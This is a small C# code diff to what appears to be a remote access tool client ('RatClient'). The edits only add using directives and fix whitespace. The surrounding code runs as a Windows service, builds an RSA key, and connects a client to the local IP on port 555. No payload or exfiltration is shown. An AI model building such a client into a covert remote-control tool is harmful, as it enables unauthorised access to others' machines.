@@ -3,8 +3,8 @@ using System.Linq;
 using System.Numerics;
 using System.ServiceProcess;
 using RatClient.Mtool;
-
-
+using System.IO;
+using System.Text;
 
 namespace RatClient 
 {
@@ -55,11 +55,10 @@ namespace RatClient
 			BigInteger e = BigInteger.Parse("65537");
 			BigInteger[] publicKey = new BigInteger[] { e, n };
 			string ipAddress = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName())
-			   .AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
+				.AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
 			Console.WriteLine(ipAddress);
 			var client = new RatClient.Client(ipAddress, 555, publicKey);
 			client.Handle();
-
 		}
 
 		private static void Stop()
